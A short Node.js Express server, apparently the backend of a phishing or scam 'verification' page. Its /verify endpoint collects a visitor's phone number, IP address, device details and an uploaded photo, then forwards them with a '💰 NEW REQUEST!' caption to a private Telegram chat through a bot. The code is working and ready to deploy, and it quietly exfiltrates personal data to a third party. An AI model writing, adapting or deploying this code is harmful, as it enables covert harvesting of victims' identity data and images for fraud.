const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');

const app = express();
const upload = multer();

// Данные из настроек Render
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use(express.static('public'));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/verify', upload.single('photo'), async (req, res) => {
    try {
        const { phone, ip, details } = req.body;
        const photo = req.file;

        // Формируем текст сообщения для Telegram
        const caption = `
💰 **НОВАЯ ЗАЯВКА!**
📞 **Данные:** ${phone}
🌐 **IP:** ${ip}

ℹ️ **ТЕХ. ИНФО:**
${details || 'Нет данных'}
        `;

        if (photo) {
            // Отправляем фото с подписью
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('caption', caption);
            form.append('parse_mode', 'Markdown');
            form.append('photo', photo.buffer, { filename: 'verification.jpg' });

            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
                headers: form.getHeaders()
            });
        } else {
            // Если фото нет, просто текст
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: caption,
                parse_mode: 'Markdown'
            });
        }

        res.sendStatus(200);
    } catch (error) {
        console.error('Ошибка:', error.message);
        res.sendStatus(500);
    }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Сервер запущен на порту ${PORT}`));